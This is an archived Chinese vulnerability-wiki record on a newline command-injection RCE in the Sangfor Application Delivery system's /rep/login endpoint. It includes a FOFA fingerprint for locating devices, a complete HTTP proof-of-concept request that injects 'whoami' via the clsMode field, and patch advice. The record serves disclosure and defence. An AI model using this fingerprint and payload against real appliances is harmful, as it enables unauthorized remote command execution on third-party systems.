---
source: "MrWQ/vulnerability-paper"
id: "vw-1291a09996452df93a163af2"
entity_id: "ve-1291a09996452df93a163af2"
schema_version: "1"
title: "【漏洞情报   新】深信服应用交付系统 RCE"
product: "Sangfor应用交付AD"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "7.0.8–7.0.8R5；修复称SP_AD_JG_01以上加固包"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5%20%E6%96%B0%20%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%B3%BB%E7%BB%9F%20RCE.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://mp.weixin.qq.com/s/UD7UZUyrwqZ-s9vET65CVA"
source_status: "recorded"
previous_fofa_unverified: "网络测绘搜索"
fofa: "fid=\"iaytNA57019/kADk8Nev7g==\""
---

# 【漏洞情报   新】深信服应用交付系统 RCE

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor应用交付AD
- 本文讨论：rep/login clsMode换行命令注入
- 版本、权限与配置前提：7.0.8–7.0.8R5；修复称SP_AD_JG_01以上加固包
- 资料类型：AD命令注入复现与加固建议；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- fofa元数据错抽“网络测绘搜索”；实际FID在正文
- 加固包“以上”是否包含01不清，缺厂商下载/公告直链
- 与349同入口重稿，截图承担执行结果；请求固定长度及端口/Origin不同
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 加固包边界及命令身份待官方/原始来源核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/UD7UZUyrwqZ-s9vET65CVA)

免责说明
----

文章所涉及内容，仅供安全研究与教学之用，由于传播、利用本文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。

产品简介
----

深信服应用交付 AD 能够为用户提供包括多数据中心负载均衡、多链路负载均衡、服务器负载均衡的全方位解决方案。不仅实现对各个数据中心、链路以及服务器状态的实时监控，同时根据预设规则，将用户的访问请求分配给相应的数据中心、 链路以及服务器，进而实现数据流的合理分配，使所有的数据中心、链路和服务器都得到充分利用。

漏洞简述
----

深信服应用交付管理系统 login 存在远程命令执行漏洞，攻击者通过漏洞可以执行任意命令。

影响版本
----

深信服应用交付管理系统 7.0.8-7.0.8R5

网络测绘
----

favicon 图标特征![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagxL87lh7HcwawaSsEVebeVvwH01X20mlyoQcAHDS6DmIicGz8djcFHZ92NTpaTJajkpvlE7RqpCic2A/640?wx_fmt=png)

FOFA 网络测绘搜索

```
fid="iaytNA57019/kADk8Nev7g=="


```

漏洞复现
----

访问登录界面![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagxL87lh7HcwawaSsEVebeVvhUibCbfnoJopsu2XVemnO12cj6utTLia464gcO5BZVJz8f62wjicYS5Xg/640?wx_fmt=png) POC

```http
POST /rep/login HTTP/1.1
Host: 1.1.1.1:85
Cookie: UEDC_LOGIN_POLICY_VALUE=checked
Content-Length: 124
Sec-Ch-Ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://1.1.1.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://1.1.1.1:85/rep/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

clsMode=cls_mode_login%0Awhoami%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123



```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagxL87lh7HcwawaSsEVebeVvPKaNnbBFkDXQzM0rcMLG4j9icqUM3hCpWVezWtw05FQSPDeR2obuX9Q/640?wx_fmt=png)

通过更改 %0A 中间的参数执行任意命令

修复方案
----

1、升级到不受影响的高版本。

2、升级 SP_AD_JG_01 以上的加固补丁包，建议使用巡检工具巡检后升级最新加固包。

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
